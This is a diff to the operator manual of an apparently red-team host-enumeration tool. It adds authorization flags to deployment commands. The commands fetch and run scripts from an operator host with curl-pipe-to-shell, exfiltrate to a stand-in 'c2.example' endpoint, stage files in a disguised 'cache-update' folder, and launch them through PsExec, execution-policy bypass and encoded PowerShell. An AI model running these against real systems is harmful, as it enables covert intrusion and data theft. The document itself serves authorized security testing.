@@ -654,8 +654,8 @@ print AppArmor/SELinux/`noexec` inventory. They do not disable those controls
 
 ```bash
 scp scripts/linux/enum.sh scripts/linux/enum.py "$TARGET:$REMOTE_DIR/"
-ssh "$TARGET" "chmod 750 $REMOTE_DIR/enum.sh $REMOTE_DIR/enum.py; bash $REMOTE_DIR/enum.sh"
-ssh "$TARGET" "python3 $REMOTE_DIR/enum.py"
+ssh "$TARGET" "chmod 750 $REMOTE_DIR/enum.sh $REMOTE_DIR/enum.py; bash $REMOTE_DIR/enum.sh --authorized"
+ssh "$TARGET" "python3 $REMOTE_DIR/enum.py --authorized"
 ```
 
 When the PE/ELF *can* run, still collect control inventory:
@@ -667,15 +667,15 @@ STEALTHY_AUTHORIZED=1 "$BIN" enum --plugins linux.endpoint_controls
 No disk scripts (stdin only):
 
 ```bash
-ssh "$TARGET" 'bash -s' < scripts/linux/enum.sh
-ssh "$TARGET" 'python3 -' < scripts/linux/enum.py
+ssh "$TARGET" 'STEALTHY_AUTHORIZED=1 bash -s' < scripts/linux/enum.sh
+ssh "$TARGET" 'STEALTHY_AUTHORIZED=1 python3 -' < scripts/linux/enum.py
 ```
 
 Curl-pipe (only from an operator URL you control; still leaves process cmdline artifacts):
 
 ```bash
-curl -fsSL "http://OPERATOR:8000/enum.sh" | bash
-curl -fsSL "http://OPERATOR:8000/enum.py" | python3 -
+curl -fsSL "http://OPERATOR:8000/enum.sh" | STEALTHY_AUTHORIZED=1 bash
+curl -fsSL "http://OPERATOR:8000/enum.py" | STEALTHY_AUTHORIZED=1 python3 -
 ```
 
 ### 2.13 Post-deploy verify (Linux)
@@ -768,8 +768,8 @@ STEALTHY_AUTHORIZED=1 "$BIN" \
 v1 does **not** silently POST. It prints a sealed blob and key for the operator to transmit on an approved channel:
 
 ```bash
-STEALTHY_AUTHORIZED=1 STEALTHY_EXFIL_URL='https://c2.example/intake' \
-  "$BIN" --output remote --exfil-url "$STEALTHY_EXFIL_URL" enum
+export STEALTHY_EXFIL_URL='https://c2.example/intake'
+STEALTHY_AUTHORIZED=1 "$BIN" --output remote --exfil-url "$STEALTHY_EXFIL_URL" enum
 ```
 
 Example operator follow-up (only on approved infra):
@@ -804,8 +804,8 @@ AMSI/ETW/EDR/AppLocker/WDAC disable (see `docs/techniques.md`).
 ### 3.7 Script fallback execution
 
 ```bash
-bash /tmp/enum.sh | tee /tmp/enum-shell.txt
-python3 /tmp/enum.py | tee /tmp/enum-python.txt
+bash /tmp/enum.sh --authorized | tee /tmp/enum-shell.txt
+python3 /tmp/enum.py --authorized | tee /tmp/enum-python.txt
 ```
 
 ### 3.8 Linux cleanup (run after evidence handling)
@@ -840,10 +840,13 @@ STDERR="linux-${RUN_UTC}.stderr.txt"
 STEALTHY_AUTHORIZED=1 "$BIN" --quiet --no-color --format json \
   --output memory enum > "$REPORT" 2> "$STDERR"
 
+# Memory mode does not create an artifact ledger; explicit file output,
+# checkpoints, and staging are tracked separately when requested.
+
 # Optional structural checks; use whichever validator is approved.
 python3 -m json.tool "$REPORT" >/dev/null
 if command -v jq >/dev/null 2>&1; then
-  jq -e '.schema_version == "1" and (.run_id | length > 0)' "$REPORT" >/dev/null
+  jq -e '.schema_version == "2" and (.run_id | length > 0)' "$REPORT" >/dev/null
 fi
 ```
 
@@ -1191,7 +1194,7 @@ Script-only via PsExec when PE is blocked but `powershell.exe` is allowed:
 
 ```cmd
 psexec64.exe \\TARGET -u DOMAIN\user -p PASSWORD -accepteula -h ^
-  powershell -NoProfile -ExecutionPolicy Bypass -File C:\Users\Public\Documents\cache-update\enum.ps1
+  powershell -NoProfile -ExecutionPolicy Bypass -File C:\Users\Public\Documents\cache-update\enum.ps1 -Authorized
 ```
 
 Useful flags (operator reminder):
@@ -1343,8 +1346,8 @@ SmartScreen, and AMSI signals. They do not disable those controls; see
 $Dir = 'C:\Users\Public\Documents\cache-update'
 New-Item -ItemType Directory -Force -Path $Dir | Out-Null
 # After copying enum.ps1 / enum.js / EnumTasks.csproj into $Dir:
-powershell -NoProfile -ExecutionPolicy Bypass -File "$Dir\enum.ps1"
-cscript //nologo "$Dir\enum.js"
+powershell -NoProfile -ExecutionPolicy Bypass -File "$Dir\enum.ps1" -Authorized
+cscript //nologo "$Dir\enum.js" --authorized
 ```
 
 When the PE *can* run, still collect control inventory:
@@ -1359,15 +1362,15 @@ From operator host over SSH:
 ssh "$TARGET" "powershell -NoProfile -Command \"New-Item -ItemType Directory -Force -Path '$REMOTE_DIR_WIN' | Out-Null\""
 scp scripts/windows/enum.ps1 scripts/windows/enum.js scripts/windows/EnumTasks.csproj \
   "$TARGET:$REMOTE_DIR/"
-ssh "$TARGET" 'powershell -NoProfile -ExecutionPolicy Bypass -File C:\Users\Public\Documents\cache-update\enum.ps1'
-ssh "$TARGET" 'cscript //nologo C:\Users\Public\Documents\cache-update\enum.js'
+ssh "$TARGET" 'powershell -NoProfile -ExecutionPolicy Bypass -File C:\Users\Public\Documents\cache-update\enum.ps1 -Authorized'
+ssh "$TARGET" 'cscript //nologo C:\Users\Public\Documents\cache-update\enum.js --authorized'
 ```
 
 WinRM script push without writing `enum.ps1` first:
 
 ```powershell
 $S = New-PSSession -ComputerName TARGET -Credential (Get-Credential)
-Invoke-Command -Session $S -FilePath .\scripts\windows\enum.ps1
+Invoke-Command -Session $S -FilePath .\scripts\windows\enum.ps1 -ArgumentList '-Authorized'
 Remove-PSSession $S
 ```
 
@@ -1376,6 +1379,7 @@ Encoded command for tiny checks (prefer files for the full script; keep encoding
 ```powershell
 $cmd = Get-Content -Raw .\scripts\windows\enum.ps1
 $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
+$env:STEALTHY_AUTHORIZED = '1'
 powershell -NoProfile -EncodedCommand $b64
 ```
 
@@ -1465,8 +1469,8 @@ $env:STEALTHY_AUTHORIZED = '1'
 ### 5.5 Script fallbacks
 
 ```powershell
-powershell -NoProfile -ExecutionPolicy Bypass -File .\enum.ps1 | Tee-Object -FilePath .\enum-ps.txt
-cscript //nologo .\enum.js > .\enum-js.txt
+powershell -NoProfile -ExecutionPolicy Bypass -File .\enum.ps1 -Authorized | Tee-Object -FilePath .\enum-ps.txt
+cscript //nologo .\enum.js --authorized > .\enum-js.txt
 ```
 
 ### 5.6 Windows cleanup
@@ -1599,14 +1603,14 @@ ssh "$TARGET" 'del /f /q C:\Users\Public\Documents\cache-update\stealthy.exe C:\
 
 ```bash
 TARGET='user@10.0.0.20'
-ssh "$TARGET" 'bash -s' < scripts/linux/enum.sh | tee "linux-enum-$(date +%Y%m%d%H%M%S).txt"
+ssh "$TARGET" 'STEALTHY_AUTHORIZED=1 bash -s' < scripts/linux/enum.sh | tee "linux-enum-$(date +%Y%m%d%H%M%S).txt"
 ```
 
 ### 6.4 Windows script-only one-shot over SSH
 
 ```bash
 TARGET='user@10.0.0.30'
-ssh "$TARGET" 'powershell -NoProfile -ExecutionPolicy Bypass -Command -' < scripts/windows/enum.ps1 \
+ssh "$TARGET" 'powershell -NoProfile -ExecutionPolicy Bypass -Command "$env:STEALTHY_AUTHORIZED = '\''1'\''; iex ([Console]::In.ReadToEnd())"' < scripts/windows/enum.ps1 \
   | tee "win-enum-$(date +%Y%m%d%H%M%S).txt"
 ```
 
@@ -1792,6 +1796,7 @@ name or directory. Resolve the exact artifact against the run log first.
 | `linux.services` | Writable service configs |
 | `linux.wildcard_cron` | Wildcard injection hints |
 | `linux.endpoint_controls` | AppArmor / SELinux / noexec / audit-Yama signals |
+| `linux.app_control` | Read-only policy, trust, audit, and fixture-validation assessment |
 
 ### Windows (`list-plugins` on a Windows build)
 
@@ -1808,6 +1813,7 @@ name or directory. Resolve the exact artifact against the run log first.
 | `windows.env_path` | PATH hijack candidates |
 | `windows.autoruns` | Run keys / Startup folders |
 | `windows.endpoint_controls` | AppLocker / WDAC / SmartScreen / AMSI / AV-EDR signals |
+| `windows.app_control` | Read-only policy, signer, trust, audit, and fixture-validation assessment |
 
 Remember: Linux builds do not contain Windows plugins and vice versa.
 Endpoint-control plugins detect constraints and recommend approved script
@@ -1822,7 +1828,8 @@ or AV/EDR (see `docs/techniques.md`).
 
 | Code / symptom | Meaning | What to do |
 | --- | --- | --- |
-| `2` + auth error text | Missing authorization ack | Pass `--i-understand-authorized-use-only` or set `STEALTHY_AUTHORIZED=1` |
+| `2` + auth error text | Missing authorization ack | Pass `--i-understand-authorized-use-only` or set `STEALTHY_AUTHORIZED=1` (direct fallbacks require the same acknowledgment) |
+| `3` from `doctor` | Readiness check failed | Resolve the reported platform, plugin, permission, or output prerequisite before running |
 | `0` with few findings | Healthy quiet host or filtered plugins | Widen `--plugins` or remove `--skip` |
 | `permission denied` running binary | No execute bit / mount `noexec` | `chmod +x` or run from executable mount; else use scripts |
 | Windows SmartScreen / AppLocker block | Custom `.exe` blocked | Use `enum.ps1` / `enum.js` / approved LOLBIN host |
